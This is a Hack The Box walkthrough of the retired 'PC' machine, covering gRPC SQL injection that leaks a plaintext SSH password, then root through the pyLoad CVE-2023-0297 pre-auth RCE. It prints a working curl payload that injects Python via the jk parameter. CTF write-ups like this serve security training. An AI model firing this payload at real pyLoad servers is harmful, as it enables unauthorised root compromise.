# PC

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP Address** | 10.10.11.214 |
| **Status** | Retired |

## Overview
PC is an Easy Linux machine whose only meaningful attack surface is a gRPC service. The gRPC endpoint is vulnerable to SQL injection, which is used to dump application data and recover plaintext credentials for SSH. Once on the box, a locally-bound `pyLoad` instance is found to be vulnerable to a pre-authentication RCE (CVE-2023-0297) and, since the service runs as root, exploiting it grants an immediate root shell.

## Reconnaissance
```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
50051/tcp open  unknown (gRPC/HTTP2 service, fingerprinted via nmap service-probe as an HTTP/2 style response)
```
A full TCP scan was required to find the non-standard `50051/tcp` gRPC port; nothing was listening on 80/443. `nmap/port50051` captured the raw HTTP/2 frame fingerprint confirming the service.

## Enumeration
Using `grpcui`/`grpcurl` to introspect the service revealed a `SimpleApp` gRPC application exposing methods such as `getInfo`, taking an authentication `token` metadata field and a numeric `id`. Testing the `id` parameter for SQL injection (via `sqlmap`'s gRPC support, request captured in `files/sql.req`) confirmed the parameter was injectable, and the underlying SQLite/SQL backend could be dumped.

```
POST /invoke/SimpleApp.getInfo HTTP/1.1
...
{"timeout_seconds":1,"metadata":[{"name":"token","value":"<token>"}],"data":[{"id":"848"}]}
```

## Foothold
Dumping the application's user table via the SQL injection recovered a set of application credentials, which included a reused password for the `sau` account: `sau:HereIsYourPassWord1431`. These credentials worked directly over SSH, providing an initial shell.

## Privilege Escalation
Local port enumeration (`ss -tlnp`/`netstat`) as `sau` showed two internally-bound services:
```
127.0.0.1:8000   (pyLoad web UI)
0.0.0.0:9666
```
The `pyLoad` instance on port 8000 was running a version vulnerable to **CVE-2023-0297**, a pre-authentication remote code execution flaw in the `/flash/addcrypted2` endpoint (it evaluates attacker-controlled Python inside the `jk` parameter):

```bash
curl -i -s -k -X POST \
  --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/lul.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&passwords=aaaa' \
  http://127.0.0.1:8000/flash/addcrypted2
```
Since `pyLoad` was running as `root`, the injected command executed with root privileges, giving full control of the machine.

## Lessons Learned
- gRPC services deserve the same input-validation scrutiny as REST APIs: SQL injection is not unique to traditional HTTP/JSON endpoints, and tools like `sqlmap` support gRPC out of the box.
- Non-standard, high-numbered ports (like `50051`) are only found through full-range port scans: never rely on a top-1000 scan alone.
- Internally-bound services (`127.0.0.1:8000`) still represent full risk once any foothold is achieved; `pyLoad`'s pre-auth RCE (CVE-2023-0297) combined with running as root turned a low-priv shell into instant root.

## Tools & References
- `files/sql.req`: captured HTTP/2 request used with `sqlmap` to confirm and exploit the gRPC SQL injection.
- `sqlmap`: used against the captured gRPC request to dump the backend database.
- `grpcurl`/`grpcui`: used to enumerate and interact with the gRPC service on port 50051.
- CVE-2023-0297: pyLoad pre-authentication remote code execution via `/flash/addcrypted2`.
